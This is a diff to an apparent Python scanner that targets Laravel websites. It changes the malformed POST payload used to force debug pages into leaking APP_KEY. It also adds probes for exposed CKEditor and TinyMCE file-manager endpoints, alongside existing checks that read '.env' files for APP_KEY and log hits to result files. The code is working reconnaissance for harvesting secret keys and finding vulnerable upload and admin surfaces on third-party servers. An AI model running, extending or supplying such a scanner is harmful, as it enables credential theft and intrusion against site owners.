@@ -60,7 +60,7 @@ def check_debug_laravel(url):
                       '(KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
     }
     try:
-        isReq = requests.post(url, data={"0x00[]": "0x00"}, headers=headers,
+        isReq = requests.post(url, data={"0x[]": "janc0xsec"}, headers=headers,
                               timeout=8, verify=False, allow_redirects=False)
         if "<td>APP_KEY</td>" in isReq.text:
             response_text = isReq
@@ -134,6 +134,8 @@ def main():
         ("/new/./.env", "APP_KEY=", "result_env2025.txt"),
         ("/docker/./.env", "APP_KEY=", "result_env2025.txt"),
         ("/@core/./.env", "APP_KEY=", "result_env2025.txt"),
+	("/file-manager/ckeditor", "vendor/file-manager/css/file-manager.css", 'result_filemanager_ckeditor_2025.txt'),
+	("/file-manager/tinymce", "vendor/file-manager/css/file-manager.css", 'result_filemanager_tinymce_2025.txt'),
         ("/admin/voyager-assets", "vendor/tcg/voyager", 'result_voyager2025.txt'),
 	("/client/manifest.json", None, 'result_vebto2025.txt')
     ]
@@ -150,4 +152,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
